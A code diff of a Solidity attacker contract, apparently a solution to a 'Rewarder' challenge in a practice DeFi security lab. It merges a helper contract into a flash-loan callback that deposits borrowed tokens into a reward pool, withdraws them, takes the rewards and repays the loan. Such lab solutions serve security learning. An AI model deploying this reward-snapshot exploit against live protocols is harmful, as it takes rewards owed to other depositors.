@@ -12,14 +12,12 @@ import { FlashLoanerPool } from "./FlashLoanerPool.sol";
 contract TheRewarderPoolAttacker {
     TheRewarderPool public pool;
     FlashLoanerPool public loaner;
-    TheRewarderPoolAttackerHelper public helper;
     address public player;
 
     constructor(TheRewarderPool pool_, FlashLoanerPool loaner_) {
         pool = pool_;
         loaner = loaner_;
         player = msg.sender;
-        helper = new TheRewarderPoolAttackerHelper();
     }
 
     function attack() external {
@@ -28,25 +26,11 @@ contract TheRewarderPoolAttacker {
 
     function receiveFlashLoan(uint256 amount) external {
         require(msg.sender == address(loaner), "Must come from loaner");
-        loaner.liquidityToken().transfer(address(helper), amount);
-        helper.depositAndWithdraw(amount);
-    }
-}
 
-contract TheRewarderPoolAttackerHelper {
-    TheRewarderPoolAttacker public attacker;
-
-    constructor() {
-        attacker = TheRewarderPoolAttacker(msg.sender);
-    }
-
-    function depositAndWithdraw(uint256 amount) external {
-        TheRewarderPool pool = attacker.pool();
         IERC20(pool.liquidityToken()).approve(address(pool), amount);
         pool.deposit(amount);
         pool.withdraw(amount);
-        pool.rewardToken().transfer(attacker.player(), pool.rewardToken().balanceOf(address(this)));
-        FlashLoanerPool loaner = attacker.loaner();
+        pool.rewardToken().transfer(player, pool.rewardToken().balanceOf(address(this)));
         loaner.liquidityToken().transfer(address(loaner), amount);
     }
 }
